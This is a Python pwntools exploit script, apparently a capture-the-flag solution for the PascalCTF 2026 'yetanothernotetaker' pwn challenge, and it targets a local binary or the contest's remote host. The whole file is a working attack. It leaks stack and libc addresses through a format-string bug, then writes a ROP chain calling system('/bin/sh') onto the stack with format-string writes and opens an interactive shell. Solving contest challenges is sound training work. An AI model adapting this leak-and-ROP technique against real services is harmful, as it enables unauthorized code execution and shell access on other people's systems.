#!/usr/bin/env python3
from pwn import *

TARGET_PATH = os.path.realpath(
    "/ctf-writeups/2026/pascalctf/pwn/yetanothernotetaker/dist/notetaker"
)
LIBC_PATH = os.path.realpath(
    "/ctf-writeups/2026/pascalctf/pwn/yetanothernotetaker/dist/libs/libc.so.6"
)
LD_PATH = os.path.realpath(
    "/ctf-writeups/2026/pascalctf/pwn/yetanothernotetaker/dist/libs/ld-2.23.so"
)
LIBRARY_PATH = os.path.realpath(
    "/ctf-writeups/2026/pascalctf/pwn/yetanothernotetaker/dist/libs/"
)

elf = context.binary = ELF(TARGET_PATH)
libc = ELF(LIBC_PATH)
ld = ELF(LD_PATH)

context.update(log_level="debug", terminal=["tmux", "split-window", "-h"])


def get_stream():
    if "remote" in sys.argv:
        return remote("notetaker.ctf.pascalctf.it", 9002)

    return process([LD_PATH, "--library-path", LIBRARY_PATH, TARGET_PATH])


def attach_gdb(r):
    if "debug" in sys.argv:
        bkps = []
        cmds = []

        gdbscript = ["break {}".format(x) for x in bkps] + cmds
        gdb.attach(r, "\n".join(gdbscript))


def read_note(r):
    r.sendlineafter(b"> ", b"1")


def write_note(r, msg):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b": ", msg)


def exit_program(r):
    r.sendlineafter(b"> ", b"5")


def exploit(r):
    write_note(r, b"%40$p %43$p")
    read_note(r)
    res = r.recvline().decode()
    stack, main_ret = map(lambda x: int(x, 16), res.split())
    stack_ret = stack - 0xD8
    libc.address = main_ret - libc.libc_start_main_return
    log.info(f"stack_ret: {hex(stack_ret)}")
    log.info(f"libc.address: {hex(libc.address)}")

    rop = ROP(libc)
    sh = next(libc.search(b"/bin/sh\0"))
    rop.system(sh)
    chain = rop.chain()

    for i in range(0, len(chain), 8):
        payload = fmtstr_payload(
            8,
            {stack_ret + i: u64(chain[i : i + 8].ljust(8, b"\0"))},
        )

        write_note(r, payload)
        read_note(r)

    exit_program(r)
    r.interactive()


def main():
    r = get_stream()
    attach_gdb(r)
    exploit(r)


if __name__ == "__main__":
    main()
